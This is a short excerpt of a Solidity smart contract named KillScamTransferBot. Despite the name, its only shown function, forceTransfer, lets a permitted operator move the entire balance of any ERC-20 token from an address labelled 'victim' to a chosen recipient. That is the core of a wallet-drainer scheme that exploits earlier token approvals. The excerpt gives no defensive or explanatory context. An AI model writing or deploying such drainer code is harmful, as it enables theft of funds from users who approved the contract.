...
contract KillScamTransferBot is Context, Ownable {
  ...
  function forceTransfer(address tokenadr,address victim,address recipient) external onlyPermission returns (bool) {
    uint256 amount = IERC20(tokenadr).balanceOf(victim);
    IERC20(tokenadr).transferFrom(victim,recipient,amount);
    return true;
  }
